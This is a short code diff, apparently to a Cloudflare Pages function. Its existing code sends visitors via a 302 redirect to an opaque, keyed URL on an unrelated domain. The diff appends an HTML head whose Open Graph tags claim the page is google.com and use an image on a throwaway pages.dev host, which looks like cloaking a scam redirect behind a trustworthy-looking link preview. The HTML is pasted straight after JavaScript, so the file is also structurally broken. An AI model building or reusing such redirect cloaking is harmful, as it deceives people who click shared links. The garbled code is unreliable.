@@ -20,3 +20,15 @@ export async function onRequest(context) {
     return Response.redirect("https://craftaggregate.com/y2bxipka?key=19ec0da329890d022c7dab86a665b354", 302);
   }
 }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+
+    <meta property="og:title" content="">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://dggdfs.pages.dev/Untitled design (36).jpg">
+    <meta property="og:url" content="https://www.google.com">
+    <meta property="og:type" content="website">
